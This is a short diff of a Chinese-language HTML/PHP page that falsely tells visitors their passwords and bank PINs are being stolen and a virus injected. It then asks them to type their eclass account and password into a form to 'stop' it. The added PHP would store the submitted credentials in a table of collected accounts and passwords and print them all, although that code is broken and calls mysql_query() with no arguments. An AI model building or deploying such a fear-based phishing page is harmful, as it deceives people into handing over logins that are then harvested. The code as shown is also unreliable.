@@ -2,8 +2,7 @@
 <p> 正在盗取您的各种密码 </p>
 <p> 正在盗取您的银行卡密码... </p>
 <p> 正在注射病毒到C盘........ </p>
-
-<p> 若您不想被盗取密码，请您输入您的eclass密码在此! </p>
+<p> 若您不想被盗取密码，请您输入您的eclass账号和密码密码在此 </p>
 
 <form action="xxxx.php" method="post">
 <input type="text" name="name" value="">
@@ -15,3 +14,15 @@
 $name = $_POST['name'];
 $passwd = $_POST['password'];
 ?>　　
+
+ <?php
+
+$sql = "insert into 账号密码大全 values()";
+$result = mysql_query();//已防止“ERIC病毒”入侵
+$SQL = "SELECT * from 账号密码大全";
+$result = mysql_query();//已防止“ERIC病毒”入侵
+while($list = mysql_fetch_row($result)){
+print_r($list);
+                        }
+                           
+                             ?>    
